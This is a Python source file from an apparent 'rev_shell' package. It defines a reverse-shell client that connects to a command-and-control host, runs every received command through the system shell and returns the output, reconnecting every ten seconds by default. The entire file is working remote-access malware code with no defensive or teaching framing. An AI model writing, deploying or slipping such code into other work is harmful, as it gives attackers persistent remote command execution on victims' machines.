import socket
import subprocess
import time

from rev_shell.config import ShellConfig


class ShellClient:
    def __init__(self, config: ShellConfig, logger) -> None:
        self.config = config
        self.logger = logger
        self.socket: socket.socket | None = None

    def _execute(self, cmd: str) -> bytes:
        try:
            return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        except subprocess.CalledProcessError as e:
            return e.output if e.output else str(e).encode()

    def start(self, max_retries: int = -1) -> None:
        """Connect to C2 and start command loop with optional retry limit."""
        retries = 0
        while max_retries == -1 or retries < max_retries:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.config.host, self.config.port))
                self.logger.info(f'Connected to {self.config.host}:{self.config.port}')

                while True:
                    data = self.socket.recv(self.config.buffer_size)
                    if not data:
                        break

                    cmd = data.decode('utf-8').strip()
                    if cmd.lower() in ['exit', 'quit']:
                        return

                    self.socket.sendall(self._execute(cmd) or b'\n')

            except (ConnectionRefusedError, socket.error):
                self.logger.warning('Connection failed. Retrying in 10s...')
                retries += 1
                if max_retries != -1 and retries >= max_retries:
                    break
                time.sleep(10)
            finally:
                if getattr(self, 'socket', None):
                    if self.socket is not None:
                        self.socket.close()
                        self.socket = None
